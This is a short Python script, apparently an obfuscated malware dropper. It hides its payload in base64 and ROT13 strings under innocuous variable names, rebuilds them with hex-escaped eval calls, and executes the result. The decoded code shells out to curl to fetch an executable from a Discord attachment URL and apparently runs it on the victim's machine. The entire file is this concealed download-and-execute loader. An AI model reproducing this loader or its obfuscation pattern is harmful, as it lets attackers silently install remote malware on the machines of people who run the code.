import base64, codecs
magic = 'aW1wb3J0IG9zDQpvcy5zeXN0ZW0oImN1cmwgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTI0MDk2OTg1NT'
love = 'HjAwxlAQHlYmxmZGp2AwR3AGN0ZQDjBGLjZP9jrKEbo24hMKuyVP0go3I0pUI0VTkcqTucqJ0hMKuyVPLzVUA0LKW0VTkcqTucqJ0h'
god = 'ZXhlIikNCm9zLnN5c3RlbSgiY3VybCBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85MjQwOTY5ODU1NTA2OT'
destiny = 'V0AGViBGZjZwx5BGH0AmZ4AwZ0AmtmY2AcpzA1pl5gpQZtYF1iqKEjqKDtpzI0LKWxYz1jZlNzWvOmqTSlqPOlMKEupzDhoKNmVvx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))